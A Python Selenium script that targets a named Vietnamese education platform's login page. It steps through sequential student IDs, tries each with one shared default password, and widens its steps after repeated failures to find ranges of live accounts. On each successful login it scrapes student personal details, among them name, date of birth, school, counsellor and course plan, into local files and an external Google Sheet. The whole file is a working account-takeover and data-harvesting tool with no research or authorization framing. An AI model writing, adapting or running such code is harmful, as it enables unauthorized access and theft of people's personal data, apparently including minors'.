from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import os
import re

def read_config(config_file="config.txt"):
    """Read configuration from config.txt."""
    config = {
        "start_id": "61655HN",
        "direction": "decrease",
        "password": "1234567",
        "max_consecutive_fails": 100,
        "step_sizes": [10, 100, 1000],
        "target_valid_ids": 10
    }
    if os.path.exists(config_file):
        with open(config_file, "r", encoding="utf-8") as f:
            for line in f:
                if "=" in line:
                    key, value = line.strip().split("=", 1)
                    if key == "step_sizes":
                        config[key] = [int(x) for x in value.split(",")]
                    elif key in ["max_consecutive_fails", "target_valid_ids"]:
                        config[key] = int(value)
                    else:
                        config[key] = value
    return config

def read_progress(progress_file="progress.txt"):
    """Read the last processed student ID from progress.txt."""
    if os.path.exists(progress_file):
        with open(progress_file, "r", encoding="utf-8") as f:
            return f.read().strip()
    return None

def write_progress(student_id, progress_file="progress.txt"):
    """Write the current student ID to progress.txt."""
    with open(progress_file, "w", encoding="utf-8") as f:
        f.write(student_id)

def generate_next_id(current_id, direction, step=1):
    """Generate the next student ID based on direction and step."""
    match = re.match(r"(\d+)([A-Z]+)", current_id)
    if not match:
        raise ValueError(f"Invalid student ID format: {current_id}")
    number, suffix = match.groups()
    number = int(number)
    if direction == "decrease":
        number -= step
    else:
        number += step
    return f"{number}{suffix}"

# Set up Selenium WebDriver
options = webdriver.ChromeOptions()
# options.add_argument('--headless')  # Uncomment for GitHub Actions
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

try:
    # Read configuration
    config = read_config()
    start_id = config["start_id"]
    direction = config["direction"]
    password = config["password"]
    max_consecutive_fails = config["max_consecutive_fails"]
    step_sizes = config["step_sizes"]
    target_valid_ids = config["target_valid_ids"]

    # Read progress or start from config
    current_id = read_progress() or start_id
    consecutive_fails = 0
    step_index = 0  # Index for step_sizes (0=1, 1=10, 2=100, 3=1000)
    valid_ids_found = 0  # Counter for successful logins

    # Set up Google Sheets API
    credentials_file = "credentials.json"
    if not os.path.exists(credentials_file):
        raise FileNotFoundError(f"Google Sheets credentials file '{credentials_file}' not found.")
    
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    creds = ServiceAccountCredentials.from_json_keyfile_name(credentials_file, scope)
    client = gspread.authorize(creds)
    sheet_id = "YOUR_SHEET_ID"  # Replace with actual Sheet ID
    try:
        sheet = client.open_by_key(sheet_id).sheet1
        # Write headers if sheet is empty
        if not sheet.get_all_values():
            headers = ["Student ID", "Username", "Học sinh", "Mã học sinh", "DOB", "Start date", 
                       "Trường học", "Nhân viên tư vấn", "Date", "Note", "Course Name", 
                       "Level", "Duration", "Final Commitment"]
            sheet.append_row(headers)
    except gspread.exceptions.SpreadsheetNotFound:
        raise Exception(f"Google Sheet with ID '{sheet_id}' not found or not accessible.")

    while step_index < len(step_sizes) + 1 and valid_ids_found < target_valid_ids:
        print(f"Trying student ID: {current_id} (Valid IDs found: {valid_ids_found}/{target_valid_ids})")
        driver.delete_all_cookies()  # Clear cookies for a clean session

        # Login
        print("Navigating to login page...")
        driver.get("https://apps.cec.com.vn/login")

        try:
            print("Waiting for username field...")
            username_field = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "input-14"))
            )
            print("Entering username...")
            username_field.send_keys(current_id)

            print("Waiting for password field...")
            password_field = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "input-18"))
            )
            print("Entering password...")
            password_field.send_keys(password)

            print("Locating login button...")
            login_button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
            )
            print("Clicking login button...")
            login_button.click()

            print("Waiting for page to load after login...")
            try:
                WebDriverWait(driver, 20).until_not(EC.url_contains("login"))
                print(f"Login successful. Current URL: {driver.current_url}")
                consecutive_fails = 0  # Reset failure counter
                valid_ids_found += 1  # Increment valid ID counter
            except:
                print(f"Login failed for ID {current_id}")
                consecutive_fails += 1
                write_progress(current_id)
                current_id = generate_next_id(current_id, direction, step=1)
                if consecutive_fails >= max_consecutive_fails:
                    if step_index < len(step_sizes):
                        print(f"{max_consecutive_fails} consecutive failures. Adjusting ID by {step_sizes[step_index]}.")
                        current_id = generate_next_id(current_id, direction, step=step_sizes[step_index])
                        step_index += 1
                        consecutive_fails = 0
                    else:
                        print(f"{max_consecutive_fails} consecutive failures after max step size. Stopping.")
                        break
                continue

            # Navigate to roadmap page
            print("Navigating to roadmap page...")
            driver.get("https://apps.cec.com.vn/student-roadmap/overview")
            print("Waiting for roadmap page to load...")
            WebDriverWait(driver, 30).until(
                EC.presence_of_element_located((By.CLASS_NAME, "roadmap-container"))
            )
            print(f"Current URL after navigation: {driver.current_url}")

            # Extract student information
            print("Extracting student information...")
            student_info = {}
            info_elements = driver.find_elements(By.XPATH, "//div[@class='list-info']//div[@class='item']")
            for item in info_elements:
                label = item.find_element(By.TAG_NAME, "h4").text.strip()
                value = item.find_element(By.XPATH, "./div[@class='row']/div[2]").text.strip()
                student_info[label] = value

            # Extract username from header
            username_elements = driver.find_elements(By.XPATH, "//p[contains(@class, 'fs-18 font-weight-bold')]")
            username = username_elements[0].text.strip().replace("Hi, ", "") if username_elements else "Unknown"

            # Extract roadmap details
            print("Extracting roadmap details...")
            roadmap_entries = []
            roadmap_elements = driver.find_elements(By.XPATH, "//div[@class='roadmap']//div[@style='display: flex;']")
            for entry in roadmap_elements:
                date = entry.find_element(By.CLASS_NAME, "date").text.strip()
                note = entry.find_element(By.CLASS_NAME, "note").text.strip()
                subtext = entry.find_element(By.CLASS_NAME, "subtext").text.strip()
                course_info = entry.find_elements(By.XPATH, ".//div[@class='rectangle']/p")
                course_name = course_info[0].text.strip()
                level = course_info[1].text.strip()
                roadmap_entries.append({
                    "Date": date,
                    "Note": note,
                    "Course Name": course_name,
                    "Level": level,
                    "Duration": subtext
                })

            # Extract final commitment
            final_commitment_elements = driver.find_elements(By.CLASS_NAME, "final")
            final_commitment = final_commitment_elements[0].text.strip() if final_commitment_elements else "Unknown"

            # Write to text file
            output_file = f"student_{current_id}.txt"
            print(f"Writing to text file: {output_file}")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("Student Information:\n")
                f.write(f"Student ID: {current_id}\n")
                f.write(f"Username: {username}\n")
                for key, value in student_info.items():
                    f.write(f"{key}: {value}\n")
                f.write("\nRoadmap Details:\n")
                for entry in roadmap_entries:
                    f.write(f"Date: {entry['Date']}\n")
                    f.write(f"Note: {entry['Note']}\n")
                    f.write(f"Course Name: {entry['Course Name']}\n")
                    f.write(f"Level: {entry['Level']}\n")
                    f.write(f"Duration: {entry['Duration']}\n")
                    f.write("\n")
                f.write(f"Final Commitment: {final_commitment}\n")

            # Upload to Google Sheet
            print("Uploading to Google Sheet...")
            for entry in roadmap_entries:
                row = [
                    current_id,
                    username,
                    student_info.get("Học sinh", ""),
                    student_info.get("Mã học sinh", ""),
                    student_info.get("DOB", ""),
                    student_info.get("Start date", ""),
                    student_info.get("Trường học", ""),
                    student_info.get("Nhân viên tư vấn", ""),
                    entry["Date"],
                    entry["Note"],
                    entry["Course Name"],
                    entry["Level"],
                    entry["Duration"],
                    final_commitment
                ]
                sheet.append_row(row)

            print(f"Data successfully saved for ID {current_id}")

            # Update progress
            write_progress(current_id)
            current_id = generate_next_id(current_id, direction, step=1)

            # Check if target valid IDs reached
            if valid_ids_found >= target_valid_ids:
                print(f"Reached target of {target_valid_ids} valid IDs. Stopping.")
                break

        except Exception as e:
            print(f"Error during processing for ID {current_id}: {str(e)}")
            consecutive_fails += 1
            write_progress(current_id)
            current_id = generate_next_id(current_id, direction, step=1)
            if consecutive_fails >= max_consecutive_fails:
                if step_index < len(step_sizes):
                    print(f"{max_consecutive_fails} consecutive failures. Adjusting ID by {step_sizes[step_index]}.")
                    current_id = generate_next_id(current_id, direction, step=step_sizes[step_index])
                    step_index += 1
                    consecutive_fails = 0
                else:
                    print(f"{max_consecutive_fails} consecutive failures after max step size. Stopping.")
                    break
            continue

except Exception as e:
    print(f"Fatal error: {str(e)}")
    print(f"Current URL: {driver.current_url}")
    print(f"Page source at failure:\n{driver.page_source[:1000]}...")
    driver.save_screenshot("error_screenshot.png")
    raise

finally:
    print("Closing browser...")
    driver.quit()
